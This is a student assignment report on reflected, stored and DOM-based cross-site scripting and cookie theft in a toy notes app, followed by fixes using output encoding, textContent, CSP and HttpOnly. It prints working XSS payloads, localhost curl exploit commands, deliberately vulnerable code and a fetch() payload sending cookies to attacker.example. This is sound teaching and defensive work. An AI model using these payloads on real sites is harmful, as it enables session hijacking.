# Cross-Site Scripting (XSS) + CSP

**Module:** WEB404 Secure Coding Practices - Assignment 4 (Topic 4)
**Author:** waangmo22@gmail.com
**Artefacts:** `vulnerable/app.py`, `fixed/app.py`, `exploits/*`, `evidence/demo-output.txt`

---

## 1. Summary

"QuickNotes" is a tiny public noticeboard: a search box, a form to post a
note, a list of everyone's notes, and a small "Welcome, `<name>`!" banner
filled in client-side. All three XSS types live on this one page, each in a
genuinely different sink:

| # | Type | Sink | Where the untrusted data comes from |
| - | ---- | ---- | ------------------------------------ |
| 1 | Reflected | `GET /search?q=` echoed into the response | the current request's query string |
| 2 | Stored | `POST /notes` saved, rendered on every later `GET /` | a database/store (here, an in-memory list) written by a previous request |
| 3 | DOM-based | client-side `innerHTML` assignment | `location.hash` - a source the **server never sees at all** |

This report also demonstrates a fourth, closely related issue - **session
cookie theft** - since that is the usual real-world *payoff* of the first
three, not a separate bug. `fixed/app.py` keeps the identical feature set and
adds output encoding, a strict CSP, and secure cookie attributes. After the
fix, all three injection points render the payload as inert text and the
cookie can no longer be read from JavaScript (section 6,
`evidence/demo-output.txt`).

---

## 2. Why all three are "XSS" but need different fixes

All three let an attacker run **arbitrary JavaScript in someone else's
browser, in the context of this site** (reading its cookies, its DOM,
submitting forms as that user). They differ in *where the untrusted data
travels before it executes*, which is exactly why one fix does not cover all
three:

* **Reflected** - the payload is part of the current HTTP request and comes
  straight back in the current HTTP response. It requires the victim to
  follow a crafted link (or submit a crafted form); it never touches storage.
* **Stored** - the payload is written once and read back on a *different*,
  later request, for a *different* visitor, with no link-clicking needed at
  all. Generally the more dangerous variant for exactly that reason.
* **DOM-based** - the payload may never touch the server. Here it lives in
  `location.hash`, which browsers do not include in the HTTP request line at
  all; the vulnerable *client-side JavaScript itself* reads it and writes it
  into the page. Server-side input validation cannot see this data - only a
  browser (or code that models one) can.

Because the vulnerable point differs, so does the fix: reflected and stored
XSS are fixed on the **server**, at the moment untrusted data is written into
an HTML response (section 5.1). DOM-based XSS is fixed in the **client-side
JavaScript**, at the moment untrusted data is written into the DOM
(section 5.3). A CSP (section 5.4) is the one control that helps against all
three at once, because it constrains what the *browser* will execute,
regardless of where the payload came from.

---

## 3. Vulnerability mechanism

### 3.1 Reflected - `vulnerable/app.py`, `do_GET`

```python
q = params.get("q", [""])[0]
result = f"<p>Showing results for: {q}</p>" if q else ""
```

`q` is pasted directly into an HTML string. If it contains `<`, `>`, or `"`,
those characters are parsed by the browser as HTML/JS syntax, not as the
literal text the developer intended to display.

### 3.2 Stored - `vulnerable/app.py`, `render_notes`

```python
f"<div class='note'><b>{n['author']}</b>: {n['message']}</div>"
```

Same bug, one request later: whatever was saved in `POST /notes` is
interpolated unescaped into every subsequent `GET /` response, for every
visitor.

### 3.3 DOM-based - `vulnerable/app.py`, inline `<script>`

```javascript
var name = decodeURIComponent(location.hash.slice(1)) || 'guest';
document.getElementById('welcome').innerHTML = 'Welcome, ' + name + '!';
```

`innerHTML` parses its argument as HTML. A string like
`<img src=x onerror=alert(document.cookie)>` becomes a real, live `<img>`
element the moment it's assigned; the browser then tries to load `x` as an
image, fails, and fires the `onerror` handler - which is JavaScript, and
runs. (A literal `<script>` tag would **not** run this way - browsers
deliberately do not execute `<script>` elements created via `innerHTML` - so
every PoC in this report uses an event-handler attribute instead, which
executes exactly as any other inline script would.)

### 3.4 The aggravating factor - the session cookie

```python
self.send_header("Set-Cookie", "session_id=demo-session-abc123")
```

No `HttpOnly` flag. Any of the three bugs above, once triggered, can run
`document.cookie` and send the result to an attacker's server:

```html
<img src=x onerror="fetch('https://attacker.example/collect?c='+document.cookie)">
```

This is why the technical scope calls out cookie attributes specifically -
without `HttpOnly`, "an XSS bug" and "a session-hijacking bug" are the same
bug.

| Weakness | CWE |
| --- | --- |
| Reflected XSS | CWE-79 |
| Stored XSS | CWE-79 |
| DOM-based XSS | CWE-79 (DOM-specific variant) |
| Non-HttpOnly session cookie | CWE-1004 |
| Missing CSP | CWE-1021 (related: Improper Restriction of Rendered UI Layers, commonly cited alongside missing CSP) |

This is OWASP **A03:2021 - Injection** (XSS is explicitly listed under this
category in the 2021 Top 10).

---

## 4. Exploitation walkthrough

Setup:

```bash
cd Assigments/Assigment_4
python3 vulnerable/app.py    # http://127.0.0.1:8001
```

All requests are wired into `exploits/0X-*.sh`. Run everything at once with
`bash exploits/run-demo.sh`. **curl has no JavaScript engine**, so it proves
reflected/stored XSS by showing the raw, unescaped payload in the HTML
response (exactly what a browser would then parse and execute); the DOM-XSS
check additionally requires one manual step in a real browser, called out
below. For the marked screenshots, replay the same requests in Burp Suite
Repeater and a browser (see `evidence/README.md`).

### 4.1 Technique 1 - Reflected XSS

```bash
curl -s -G http://127.0.0.1:8001/search \
  --data-urlencode 'q=<img src=x onerror=alert(document.cookie)>'
```

**Observed result:**

```html
<p>Showing results for: <img src=x onerror=alert(document.cookie)></p>
```

The payload comes back byte-for-byte, unescaped. A browser rendering this
response parses `<img ...>` as a real element and fires `onerror`
immediately.

**Tools:** `exploits/01-reflected-xss.sh`; Burp Repeater, or paste the URL
into a browser directly. Screenshot: `evidence/01-reflected-vuln.png`.

### 4.2 Technique 2 - Stored XSS

```bash
curl -s http://127.0.0.1:8001/notes \
  --data-urlencode 'author=mallory' \
  --data-urlencode 'message=<img src=x onerror=alert(document.cookie)>'
curl -s http://127.0.0.1:8001/
```

**Observed result:**

```html
<div class='note'><b>mallory</b>: <img src=x onerror=alert(document.cookie)></div>
```

Unlike Technique 1, no second request needs to carry the payload - it is now
permanently part of the page every visitor loads.

**Tools:** `exploits/02-stored-xss.sh`; the note-posting form in a browser,
then reload as a "second visitor". Screenshot: `evidence/02-stored-vuln.png`.

### 4.3 Technique 3 - session cookie theft

```bash
curl -s -D - -o /dev/null http://127.0.0.1:8001/ | grep -i set-cookie
```

**Observed result:** `Set-Cookie: session_id=demo-session-abc123` - no
`HttpOnly`. Since curl cannot run the `onerror` handler itself,
`exploits/03-cookie-theft.sh` simulates what a victim's browser running
either PoC above would do: it calls the app's own `/collect` endpoint (a
stand-in for an attacker's server) with the cookie value directly, and
confirms it arrives:

```
/collected now contains: ["session_id=demo-session-abc123"]
```

**Tools:** `exploits/03-cookie-theft.sh`; browser DevTools Application tab to
inspect the cookie flags directly. Screenshot: `evidence/03-cookie-vuln.png`.

### 4.4 Technique 4 - DOM-based XSS

The payload never reaches the server - `curl http://127.0.0.1:8001/` always
returns the exact same static page and script, regardless of the URL
fragment, because fragments aren't part of the HTTP request at all.
`exploits/04-dom-xss-check.sh` instead confirms the vulnerable **code path**
is present:

```bash
curl -s http://127.0.0.1:8001/ | grep "getElementById('welcome')"
```

```javascript
document.getElementById('welcome').innerHTML = 'Welcome, ' + name + '!';
```

**Manual verification (required - curl cannot execute this):** open, in any
browser,

```
http://127.0.0.1:8001/#<img src=x onerror=alert(document.cookie)>
```

**Expected result:** an alert box showing the session cookie, with nothing
resembling the payload ever appearing in the app's server logs or in a
network capture - the entire attack is client-side only.

**Tools:** `exploits/04-dom-xss-check.sh` (static check) + a browser (dynamic
proof). Screenshot: `evidence/04-dom-vuln.png`.

---

## 5. Remediation

`fixed/app.py` is a line-for-line hardening of `vulnerable/app.py`. Inspect
it with `diff -u vulnerable/app.py fixed/app.py`.

### 5.1 Context-aware output encoding (primary fix for Techniques 1 & 2)

```python
result = f"<p>Showing results for: {html.escape(q)}</p>" if q else ""
...
f"<b>{html.escape(n['author'])}</b>: {html.escape(n['message'])}</div>"
```

`html.escape()` turns `<`, `>`, `&`, `"`, and `'` into their HTML entity
forms (`&lt;`, `&gt;`, `&amp;`, `&#x27;`, `&quot;`). The browser then renders
literal, inert text - there is no longer any way for the *value* of user
input to change the *structure* of the surrounding HTML, which is the same
principle behind parameterised SQL queries in Assignment 1: keep data and
code (here, markup) in separate channels, permanently.

**Blocks Techniques 1 and 2.** Observed:
`&lt;img src=x onerror=alert(document.cookie)&gt;`.

### 5.2 Input sanitisation - defence in depth, not the fix

```python
def sanitize(value: str, max_len: int) -> str:
    cleaned = "".join(ch for ch in value if ch == " " or ch.isprintable())
    return cleaned[:max_len]
```

This caps length and strips control characters on stored input. It is
*deliberately* not a blocklist of "dangerous" substrings like `<script>` -
those are well documented to be bypassable (`<ScRiPt>`, HTML entities,
nested tags like `<scr<script>ipt>`, event-handler attributes on tags no one
blocked, etc.). The property that actually stops execution is the output
encoding in 5.1; this step only reduces the attack surface and payload size,
which the "Application of Concepts" grading criterion is exactly the kind of
distinction it rewards understanding.

### 5.3 Fix the DOM sink itself (fix for Technique 3/DOM)

```javascript
document.getElementById('welcome').textContent = 'Welcome, ' + name + '!';
```

`innerHTML` parses its argument as markup; `textContent` never does - it
always sets the plain text content of the element, no matter what the string
contains. There is no encoding function needed here at all, because the sink
itself no longer interprets its input as code. (The general rule: prefer
`textContent`/`setAttribute` for untrusted data; the handful of cases that
genuinely need to insert markup call for a sanitising library that parses and
allow-lists tags, never for hand-rolled escaping of `innerHTML` input.)

**Blocks the DOM-based technique.** Observed: opening the same payload URL
against `:8002` shows the literal text "Welcome, `<img src=x
onerror=alert(document.cookie)>`!" with no alert.

### 5.4 Content-Security-Policy (defence in depth for all three)

```python
CSP = (
    "default-src 'self'; script-src 'self'; style-src 'self'; "
    "object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
)
self.send_header("Content-Security-Policy", CSP)
```

Sent on every response. `script-src 'self'` with **no `'unsafe-inline'`**
means the browser will only execute script loaded from this same origin as an
external file - it refuses to run inline `<script>` blocks and inline event
handlers (`onerror=`, `onclick=`, ...) *regardless of where they came from*.
This is the one control here that would still have blocked execution even if
the output-encoding fix in 5.1 had a bug in it, or a new endpoint were added
later without it - CSP fails closed for the whole page, not per-field. It is
explicitly not a replacement for output encoding (a CSP violation is still an
injection that happened; it's just one the browser refused to run), which is
why the fixed build keeps both.

**Verified via headers**, since the *behavioural* proof (a blocked script,
visible as a console warning) needs a real browser:
`Content-Security-Policy: default-src 'self'; script-src 'self'; ...` present
on `:8002`, absent on `:8001`.

### 5.5 Secure cookie attributes

```python
self.send_header("Set-Cookie", "session_id=demo-session-abc123; HttpOnly; SameSite=Lax")
```

* `HttpOnly` - `document.cookie` cannot see this cookie at all. This closes
  off the most common *payoff* of XSS (session theft) even on the day some
  future encoding bug is introduced - it does not depend on the page being
  otherwise safe.
* `SameSite=Lax` - the cookie is not attached to most cross-site requests,
  narrowing CSRF exposure as a side benefit.
* `Secure` is **intentionally not set** in this build: this demo serves plain
  HTTP on `127.0.0.1`, and browsers silently drop `Secure` cookies sent over
  a non-HTTPS connection, which would break the demo entirely rather than
  make it safer. Any real deployment is HTTPS and **must** add `Secure` as a
  sixth control alongside the five above.

**Blocks the cookie-theft technique.** Observed:
`exploits/03-cookie-theft.sh` against `:8002` reports
`blocked -> cookie is HttpOnly, document.cookie cannot see it from JS` before
ever attempting the simulated exfiltration.

---

## 6. Verification - proof the exploits no longer work

`bash exploits/run-demo.sh` runs every check against the vulnerable build
(:8001) and the fixed build (:8002). Full transcript:
`evidence/demo-output.txt`.

| Technique | vs vulnerable `:8001` | vs fixed `:8002` |
| --- | --- | --- |
| 1 - reflected | `REFLECTED unescaped -> would execute in any browser` | `blocked -> payload was HTML-encoded` |
| 2 - stored | `STORED unescaped -> every visitor's browser renders and runs this payload` | `blocked -> payload was HTML-encoded before being stored/rendered` |
| 3 - cookie theft | `STOLEN -> ... could exfiltrate this session cookie` | `blocked -> cookie is HttpOnly, document.cookie cannot see it from JS` |
| 4 - DOM-based | `VULNERABLE sink present -> innerHTML fed directly by location.hash` (+ manual alert) | `blocked -> sink uses textContent` (+ manual: no alert) |
| CSP / cookie flags | `no CSP` / `NOT HttpOnly` / `does NOT set SameSite` | `CSP blocks inline script execution` / `HttpOnly` / `sets SameSite` |

Screenshots: `evidence/0X-*-fixed.png` and `evidence/diff.png`.

---

## 7. Why the fix works

* **Reflected & stored** fail because the browser never sees `<`, `>`, `"`,
  or `'` as those characters - it sees their harmless text entities. There is
  no code path left where the *content* of `q`, `author`, or `message` can
  change the *shape* of the HTML document; the shape was fixed by the
  template before the data was ever inserted.
* **DOM-based** fails because `textContent` is defined, by the DOM
  specification, to never interpret its argument as markup - it is not that
  the dangerous characters are escaped, it's that there is no parser step to
  exploit at all in that assignment.
* **CSP** fails the attacker even in scenarios 1-3 not covered here (a future
  field the developers forget to escape) because it is enforced by the
  browser independently of the server's own logic, based purely on "did this
  script come from an allowed source, inline or external" - an injected
  string is never an allowed source.
* **Cookie theft** fails because `HttpOnly` removes `document.cookie`'s
  ability to see the cookie at the JavaScript API level - it doesn't matter
  whether an XSS bug exists elsewhere on the page; the cookie was never a
  reachable target for it in the first place.

Each control removes a different assumption the vulnerable code made about
what would only ever contain safe, well-formed HTML, JavaScript, or a
readable cookie - and each keeps working even if one of the others fails.

---

## 8. Mapping to learning outcomes

| LO | Where addressed |
| --- | --- |
| LO2 - attack mechanisms | section 3 (mechanism per XSS type), section 4 (four techniques executed) |
| LO5 - assess effectiveness of fixes | section 6 (before/after matrix), `run-demo.sh` re-tests every exploit |
| LO6 - secure development | section 5 (encoding, CSP, cookie attributes, DOM sink fix), `fixed/app.py` |

## 9. References

* OWASP Top 10 2021 - **A03:2021 Injection** (XSS).
* OWASP **XSS Prevention Cheat Sheet** - context-aware output encoding as the
  primary control, by injection context (HTML body, attribute, URL, JS).
* OWASP **DOM-based XSS Prevention Cheat Sheet** - safe vs. dangerous DOM
  sinks (`textContent` vs `innerHTML`, `setAttribute` vs inline handlers).
* OWASP **Content Security Policy Cheat Sheet**.
* MITRE **CWE-79** (Cross-Site Scripting), **CWE-1004** (Sensitive Cookie
  Without HttpOnly Flag).

## Appendix - full demo transcript

See `evidence/demo-output.txt` (regenerate with `bash exploits/run-demo.sh`).
